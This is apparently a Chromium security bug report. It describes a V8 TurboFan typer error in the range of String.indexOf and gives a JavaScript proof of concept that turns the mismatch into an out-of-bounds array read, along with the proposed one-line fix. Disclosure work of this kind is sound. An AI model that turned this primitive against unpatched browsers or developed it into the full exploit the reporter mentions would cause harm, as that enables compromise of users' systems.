VULNERABILITY DETAILS
The typer returns a range from -1 to String::kMaxLength - 1 for String.indexOf:
https://cs.chromium.org/chromium/src/v8/src/compiler/typer.cc?rcl=8cd4009c5b7072ad224f19a9e668ec0ed7430599&l=1456

However, indexOf can actually return String::kMaxLength (2**28-16):
'A'.repeat(2**28-16).indexOf("", 2**28).toString(16)

Since the optimizer is confused about the potential return values, you can use it to optimize away array accesses and get an out of bounds read-write primitive.

The fix should simply be to remove the - 1 in that line.

VERSION
Chrome Version: 60.0.3112.113 + stable
Operating System: Ubuntu 17.04

REPRODUCTION CASE

Here's how you trigger an out of bounds read. I can also share a full exploit to UXSS/code exec if you're interested.

function maxstring() {
  // force TurboFan
  try {} finally {}

  var i = 'A'.repeat(2**28 - 16).indexOf("", 2**28);
  i += 16; // real value: i = 2**28, optimizer: i = 2**28-1
  i >>= 28; // real value i = 1, optimizer: i = 0
  i *= 100000; // real value i = 100000, optimizer: i = 0
  if (i > 3) {
    return 0;
  } else {
    var arr = [0.1, 0.2, 0.3, 0.4];
    return arr[i];
  }
}

function opttest() {
  // call in a loop to trigger optimization
  for (var i = 0; i < 100000; i++) {
    var o = maxstring();
    if (o == 0 || o == undefined) {
      continue;
    }
    return o;
  }
  console.log("fail");
}

opttest();